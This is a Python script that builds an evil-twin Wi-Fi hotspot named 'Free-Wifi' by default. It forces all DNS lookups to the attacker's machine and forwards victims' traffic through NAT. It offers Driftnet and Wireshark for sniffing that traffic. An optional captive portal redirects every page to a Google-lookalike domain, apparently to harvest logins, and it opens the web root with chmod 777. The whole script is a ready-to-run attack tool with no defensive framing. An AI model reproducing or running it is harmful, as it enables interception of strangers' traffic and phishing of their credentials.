#!/usr/bin/python3
import os, sys
import random as rand
from argparse import ArgumentParser, ArgumentTypeError

cwd = os.getcwd()+"/"
try:
 #Flush iptables 1
 def flushIpTables():
  os.system("sudo iptables --flush")
  os.system("sudo iptables --table nat --flush")
  os.system("sudo iptables --delete-chain")
  os.system("sudo iptables --table nat --delete-chain")
  os.system("sudo iptables --flush -t nat")
  os.system("sudo iptables --table nat --delete-chain")
 #...0

 #write file function
 def write_file(path, s):
  os.system("sudo echo -e \""+s+"\" > "+path)
  os.system("sudo sed -i 's/\r//' "+path)
 #...0

 #kill stop all
 def killSall():
  print("")
  print("[~~] Stopping...")
  os.system("sudo pkill dnsmasq > /dev/null 2>&1")
  os.system("sudo killall hostapd > /dev/null 2>&1")
  os.system("sudo sysctl net.ipv4.ip_forward=0 > /dev/null 2>&1")
  print("[~~] Restarting Network-Manager...")
  os.system("sudo service NetworkManager restart")
  print("!done..")
  #...0


 ###################################################
 ###################################################
 os.system("sudo echo")

 wlan_ap = input("[??] Input wireless adapter's name:(wlan0) ") or "wlan0"
 eth_ap = input("[??] Input internet access point name:(eth0) ") or "eth0"

 #..DNSMASQ CONFIG 1
 print("")
 print("[~~] Creating /dnsmasq.conf...")
 os.system("sudo service NetworkManager restart")
 os.system("sudo pkill dnsmasq")
 dnsmasq_txt = "#disable dnsmasq reading other files ~ /etc/resolv.conf for nameservers\nno-resolv\n\ninterface="+wlan_ap+"\n\n#starting_range,end_range,lease_time\ndhcp-range=10.0.0.3,10.0.0.20,12h\n\n#dns addresses to send to the clients\n\
 server=8.8.8.8\n\
 server=0.0.0.0\n\
 dhcp-option=3,10.0.0.1\n\
 dhcp-option=6,10.0.0.1\n\
 address=/#/10.0.0.1\n\
 no-hosts\n"
 write_file("/tmp/acp_dnsmasq.conf", dnsmasq_txt)
 #...0

 #..HOSTAPD CONFIG 1
 print("")
 ssid = input("[??] Input ssid name:(Free-Wifi) ") or "Free-Wifi"
 rnd = rand.randint(0, 9)
 channel = input("[??] Input channel number:("+str(rnd)+") ") or str(rnd)

 hostapd_txt = "interface=" + wlan_ap + "\ndriver=nl80211\nssid=" + ssid + "\nhw_mode=g\nchannel=" + channel + "\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\n"
 print("")
 print("[~~] creating /hostapd.conf ...")
 write_file("/tmp/acp_hostapd.conf", hostapd_txt)
 #...0

 #..IPTABLES 1
 print("")
 print("[~~] Configuring AP interface...")
 os.system("sudo ifconfig " + wlan_ap + " up 10.0.0.1 netmask 255.255.255.0")

 print("[~~] Applying iptables rules...")
 flushIpTables()
 os.system("sudo sysctl net.ipv4.ip_forward=1 > /dev/null 2>&1")
 os.system("sudo iptables --table nat --append POSTROUTING --out-interface " + eth_ap + " -j MASQUERADE")
 os.system("sudo iptables --append FORWARD --in-interface " + wlan_ap + " -j ACCEPT")
 os.system("sudo iptables -t nat -A POSTROUTING -o "+eth_ap+" -j MASQUERADE")
 #...0

 ###########################
 ###########################
 #start dnsmasq hostapd 1
 print("")
 print("[~~] Starting DNSMASQ server...")
 os.system("sudo pkill dnsmasq")
 os.system("sudo dnsmasq -C /tmp/acp_dnsmasq.conf")
 print("[~~] Starting HOSTAPD server...")
 print("")
 input("[!!] Press Enter to continue: ")
 ############# others 1
 print("")
 ##Driftnet 1
 fiDriftnet = input("[!?] Use Driftnet (y/N): ")
 if(fiDriftnet == "y"):
  os.system("sudo driftnet -i "+wlan_ap+" &")
 ##wireshark 1
 fiwireshark = input("[!?] Use wireshark (y/N): ")
 if(fiwireshark == "y"):
  os.system("sudo wireshark -i "+wlan_ap+" -k &")
 ##captivePortal 1
 ficaptivePortal = input("[!?] Enable captivePortal (y/N): ")
 if(ficaptivePortal == "y"):
  captivePortal_filename = input("[!?] Select file name - /var/www/html/:(index.html) ") or "index.html"
  os.system("sudo echo -e \"RewriteEngine on\n\
		RewriteCond %{REQUEST_URI} !^/"+captivePortal_filename+"\n\
		RewriteRule (.*) http://googleauthentication.com/"+captivePortal_filename+" [R=302,L]\" > /var/www/html/.htaccess")
  os.system("sudo chmod 777 /var/www/html/ && sudo chmod 777 /var/www/html/*")
  os.system("sudo echo -e \"<Directory /var/www/>\n\
   	 	Options Indexes FollowSymLinks\n\
   	 	AllowOverride All\n\
   	 	Require all granted\n</Directory>\" >> /etc/apache2/sites-available/000-default.conf")
  os.system("sudo service apache2 start && sudo service apache2 restart && a2enmod rewrite > /dev/null 2>&1")
###################...0
 print("")
 print("")
 os.system("sudo killall hostapd > /dev/null 2>&1")
 os.system("sudo hostapd /tmp/acp_hostapd.conf")
 #...0

 #end all
 flushIpTables()
 killSall()
 #...0
except:
 #..stop all
 flushIpTables()
 killSall()
 print("Error:-",sys.exc_info())
 #...0
